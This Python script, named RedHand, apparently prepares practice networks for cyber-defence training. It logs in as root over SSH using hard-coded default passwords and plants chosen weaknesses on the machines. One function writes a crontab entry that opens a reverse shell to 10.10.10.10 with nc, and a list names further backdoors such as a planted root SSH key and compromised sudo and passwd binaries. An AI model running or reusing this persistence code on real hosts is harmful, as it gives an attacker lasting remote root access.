#!/usr/bin/env python3
import file
import paramiko
import os
import sys

def main():
    os.system("rm -rf /tmp/github")
    print("Checking for updates...")
    if(updatePend()):
        option = input ("An update is available. Would you like to update? ")
        if(option.lower() == "y" or option.lower() == "yes"):
            os.system("python3 /lib/RedHand/updater.py &")
            return
    else:
        print("RedHand is up to date.")
    z = False
    if (not isFirstTime()):
        z = True
    if(isFirstTime()):
        print("Running first time setup...")
        
        
        ecommAddr = input("Enter Ecom IP: ")
        ecommOS = input("Enter Ecom OS(plus version): ")
        fedoraAddr = input("Enter Fedora IP: ")
        fedoraOS = input("Enter Fedora OS(plus version): ")
        splunkAddr = input("Enter Splunk IP: ")
        splunkOS = input("Enter Splunk OS(plus version): ")
        ubuntuAddr = input("Enter Ubuntu IP: ")
        ubuntuOS = input("Enter Ubuntu OS(plus version): ")
        debianAddr = input("Enter Debian IP: ")
        debianOS = input("Enter Debian OS(plus version): ")
        
        os.system(f'echo "ecomm:{ecommAddr}:{ecommOS}" >> /lib/RedHand/network.conf')
        os.system(f'echo "fedora:{fedoraAddr}:{fedoraOS}" >> /lib/RedHand/network.conf')
        os.system(f'echo "splunk:{splunkAddr}:{splunkOS}" >> /lib/RedHand/network.conf')
        os.system(f'echo "ubuntu:{ubuntuAddr}:{ubuntuOS}" >> /lib/RedHand/network.conf')
        os.system(f'echo "debian:{debianAddr}:{debianOS}" >> /lib/RedHand/network.conf')
        
        option = input("Would you like to start RedHand? ")
        if(option.lower() == "y" or option.lower() == "yes"):
            z = True
        else:
            return
    if(z):
        network = getNetInfo()
        legend = getLegend()
        del(legend[0]) #Removes weird empty entry at beginning of legend
        if(legend == "invalid"):
            a = False   #No saved legend
        else:
            a = True
        print("Current presets: ")
        for preset in legend:
            print(preset[0])
def isFirstTime():
    conf = open("/lib/RedHand/network.conf", "r")
    cont = conf.read()
    if(len(cont.split("\n")) < 2):
        return True
    return False
def getNetInfo():
    network = [[]]
    conf = open("/lib/RedHand/network.conf", "r")
    cont = conf.read()
    contLined = cont.split("\n")
    del(contLined[len(contLined)-1])
    for line in contLined:
        lineSplit = line.split(":")
        machine = lineSplit[0]
        address = lineSplit[1]
        os = lineSplit[2]
        machineList = []
        machineList.append(machine)
        machineList.append(address)
        machineList.append(os)
        network.append(machineList)
    return network
def getDefaultDependencies(network):
    defaultDependencies = ["ncat", "python3", "git"]
    for machine in network:
        password = getDefPassword(machine[0])
        address = machine[1]
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(address, username="root", password=password)
        
        if(getPacMan(machine[0]) == "yum"):
            for item in defaultDependencies:
                command = f"yum install -y {item}"
                stdin, stdout, stderr = ssh_client.exec_command(f"echo {password} | sudo -S {command}")
        elif(getPacMan(machine[0]) == "apt"):
            for item in defaultDependencies:
                command = f"apt-get install -y {item}"
                stdin, stdout, stderr = ssh_client.exec_command(f"echo {password} | sudo -S {command}")
def getLegend():
    returnList = [[[]]]
    f = open("/lib/RedHand/legend.list", "r")
    legendStr = f.read()
    legendList = legendStr.split(".\n")
    x = len(legendList)
    if(x <= 0):
        return "invalid"
    for preset in legendList:
        presetArray = [[]]
        presetSplit = preset.split(":\n")
        presetTitle = presetSplit[0].split(",")
        
        presetNum = presetTitle[0]
        presetDiff = presetTitle[1]
        
        presetList = presetSplit[1]
        
        presetListSplit = presetList.split("\n")
        
        for machine in presetListSplit:
            machineVulns = []
            infoList = machine.split(";")
            if(len(infoList) == 1):
                pass
            else:
                machineName = infoList[0]
                machineVulns = infoList[1].split(",")
                presetArray.append([machineName, machineVulns])
            
        returnList.append([presetNum, presetDiff, presetArray])
    return returnList
def loadWeakness(machine, set, weakness):
    address = machine[1]
    
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(address, username="root", password=getDefPassword(machine[0]))
    
    if(weakness == "1"):
        command = '"* * * * * root /usr/bin/nc 10.10.10.10:6969 -e /bin/bash" >> /etc/crontab'
        stdin, stdout, stderr = ssh_client.exec_command(f"{command}")
def updatePend():
    os.system("git clone https://github.com/ravesec/horror /tmp/github > /dev/null 2>&1")
    fOne = open("/lib/RedHand/version", "r")
    currentVers = fOne.read()
    fTwo = open("/tmp/github/RedHand/version", "r")
    gitVers = fTwo.read()
    if(currentVers == gitVers):
        return False
    else:
        return True
def getDefPassword(hostName):
    return {
        "ecomm": "changeme",
        "fedora": "!Password123",
        "splunk": "changemenow",
        "ubuntu": "changeme",
        "debian": "changeme",
    }.get(hostName, "")
def transNumToWeakness(num):
    return {
        "1": "Reverse Shell in /etc/crontab",
        "2": "Pre-Set admin user",
        "3": "Pre-Planted Root SSH Key",
        "4": "Venom Backdoor Install",
        "5": "Compromised /bin/passwd",
        "6": "Compromised /bin/sudo",
        "7": "Pre-Planted SkyKit",
    }.get(num, "")
def getPacMan(machine):
    return {
        "ecomm": "yum",
        "fedora": "yum",
        "splunk": "yum",
        "ubuntu": "apt",
        "debian": "apt",
    }.get(machine, "")
main()